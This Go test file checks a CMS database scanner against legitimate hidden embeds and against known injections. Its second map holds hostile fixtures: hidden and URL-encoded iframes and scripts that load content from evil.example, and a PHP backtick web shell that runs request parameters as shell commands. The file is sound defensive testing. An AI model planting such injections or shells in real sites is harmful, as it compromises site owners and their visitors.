package cms

import "testing"

// Database rows from the fleet's DB scanner logs that were reported and
// are not injections (inert copies), and the injections found next to
// them, which must stay found.
func TestFleetDBFalsePositives(t *testing.T) {
	for name, v := range map[string]string{
		"embed, escaped permalink": `<iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; visibility: hidden;" title="News" src="https://news.example/?p=5033&amp;embed=true#?secret=sIKr" data-secret="sIKr" width="500" height="282"></iframe>`,
		"embed, &#038; permalink":  `<iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; visibility: hidden;" src="https://news.example/?p=4095&#038;embed=true#?secret=ab" data-secret="ab"></iframe>`,
		"embed without class":      `<iframe sandbox="allow-scripts" security="restricted" style="position: absolute; visibility: hidden;" title="Our Services" src="https://shop.example/our-services/embed/#?secret=Dm4s#?secret=Vfyh" data-secret="Vfyh" width="500" height="282"></iframe>`,
		"Gravity Forms AJAX frame": `<iframe style="display:none;width:0px;height:0px;" src="https://blog.example/some-post/about:blank" name="gform_ajax_frame_81" id="gform_ajax_frame_81" title="This iframe contains the logic required to handle Ajax powered Gravity Forms."></iframe>`,
		"Jetpack Likes":            `<iframe src='https://widgets.wp.com/likes/master.html?ver=20251219#ver=20251219' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>`,
		"lazy Likes":               `<iframe data-lazyloaded="1" src="https://blog.example/a-post/about:blank" data-src="https://widgets.wp.com/likes/master.html?ver=202211" id="likes-master" style="display:none;"></iframe>`,
		"lazy GA noscript":         `<noscript><iframe data-lazyloaded="1" src="https://blog.example/b/about:blank" data-src="https://www.google-analytics.com/collect?t=event&amp;v=1" height="0" width="0" style="display:none"></iframe></noscript>`,
		"Ad Manager safeframe":     `<iframe frameborder="0" src="https://0a1b2c.safeframe.googlesyndication.com/safeframe/1-0-38/html/container.html" id="google_ads_iframe_x" title="3rd party ad content" width="0" height="55"></iframe>`,
		"AdSense related search":   `<iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="100%" style="visibility:hidden;height:0" src="https://syndicatedsearch.goog/afs/ads?adtest=off"></iframe>`,
		"BeyondWords player":       `<iframe id="speechkit-io-iframe" frameborder="0" scrolling="no" style="display: none" data-src="https://audio.beyondwords.io/a/4035674"></iframe>`,
		"old lead widget":          `<script type="text/javascript">var po_host=(("https:"==document.location.protocol)?"https://":"http://");document.write(unescape("%3Cscript src='"+po_host+"leads.widget.example/js/embed.js?apikey=abc' type='text/javascript'%3E%3C/script%3E"));</script>`,
		"encoded visible player":   `<script language="javascript"> document.write(unescape('%3C%63%65%6E%74%65%72%3E%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%70%6C%61%79%65%72%2E%65%78%61%6D%70%6C%65%2F%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%38%30%25%3B%68%65%69%67%68%74%3A%35%36%30%70%78%22%3E%3C%2F%69%66%72%61%6D%65%3E')); </script>`,
		"shortcode with JS":        "<?php function kod_tool(){ ob_start(); ?><script>const out = `Code for ${name}`; el.innerHTML = out;</script><img src=\"<?php echo esc_url($logo); ?>\"><?php return ob_get_clean(); } add_shortcode('kod', 'kod_tool'); $q = isset($_GET['q']) ? sanitize_text_field($_GET['q']) : '';",
	} {
		if d := ScanValueDetail(v); d.Signature != "" {
			t.Errorf("%s: reported as %s", name, d.Signature)
		}
	}
	for name, v := range map[string]string{
		"1px traffic frame":     `<p>Text</p><iframe style="position: absolute; height: 1px,width:1px; top: 0; left: 0; border: none; visibility: hidden;" src="//traffic.example/public"></iframe>`,
		"hidden ad frame":       `<iframe data-aa='1' src='//ads.example/1' style="display: none;"></iframe>`,
		"lazy, hidden remote":   `<iframe data-lazyloaded="1" src="https://blog.example/c/about:blank" data-src="https://evil.example/in.php" style="display:none"></iframe>`,
		"fake embed, escaped":   `<iframe style="visibility: hidden;" src="https://evil.example/?p=1&amp;embed=true"></iframe>`,
		"encoded script":        `<script>document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6A%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));</script>`,
		"encoded hidden frame":  `<script>document.write(unescape('%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%20%77%69%64%74%68%3D%22%30%22%20%68%65%69%67%68%74%3D%22%30%22%3E%3C%2F%69%66%72%61%6D%65%3E'));</script>`,
		"unescape of variable":  `<script>var p='%3C%73%63';document.write(unescape(p));</script>`,
		"backtick shell in PHP": "<?php echo `ls ${_GET['d']}`; echo `id $_GET[c]`; ?>",
	} {
		if d := ScanValueDetail(v); d.Signature == "" {
			t.Errorf("%s: not found", name)
		}
	}
}
